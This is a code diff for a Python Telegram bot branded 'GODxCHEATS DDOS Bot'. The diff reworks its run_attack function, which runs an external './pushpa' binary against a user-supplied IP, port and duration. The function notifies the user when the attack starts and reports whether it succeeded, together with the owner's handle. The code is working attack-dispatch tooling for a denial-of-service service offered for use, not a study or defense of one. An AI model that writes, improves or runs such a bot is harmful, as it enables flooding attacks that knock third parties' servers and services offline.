@@ -68,32 +68,47 @@ async def open_command(update: Update, context: CallbackContext):
     )
 
 # Run the attack command
+# Run the attack command
 async def run_attack(chat_id, ip, port, duration, context):
     try:
-        # Execute the external command
+        # Notify the user that the attack has started
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=f"🚀 Attack started on {ip}-:-{port} for {duration} seconds..."
+        )
+
+        # Execute the external command and wait for its completion
         process = await asyncio.create_subprocess_shell(
             f"./pushpa {ip} {port} {duration}",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
-        await process.communicate()
+        
+        # Wait for the command to finish
+        stdout, stderr = await process.communicate()
 
-    except Exception as e:
-        # Send an error message if the attack fails
-        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ Error: {str(e)}")
-    finally:
-        # Send attack finished message
-        await context.bot.send_message(
-            chat_id=chat_id,
-            text=(
-                "*✅ Attack Finished Successfully!*\n\n"
-                "*Thank you for using GODxCHEATS DDOS Bot.*\n"
-                "*Send Feedback to the Owner:* @GODxAloneBOY"
-            ),
-            parse_mode="Markdown"
+        # Log the output for debugging (optional)
+        if stdout:
+            print(f"[STDOUT]: {stdout.decode()}")
+        if stderr:
+            print(f"[STDERR]: {stderr.decode()}")
+
+        # Check if the process completed successfully
+        if process.returncode == 0:
+            result_message = "*✅ Attack Finished Successfully!*\n\n"
+        else:
+            result_message = f"*⚠️ Attack Failed with Return Code {process.returncode}*\n\n"
+
+        # Add a footer to the result message
+        result_message += (
+            "*Thank you for using GODxCHEATS DDOS Bot.*\n"
+            "*Send Feedback to the Owner:* @GODxAloneBOY"
         )
+        await context.bot.send_message(chat_id=chat_id, text=result_message, parse_mode="Markdown")
+    except Exception as e:
+        # Handle exceptions gracefully and notify the user
+        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ Error: {str(e)}")
 
-# Approve users or groups
 # Approve users or groups
 async def approve(update: Update, context: CallbackContext):
     await track_user(update)  # Track the user
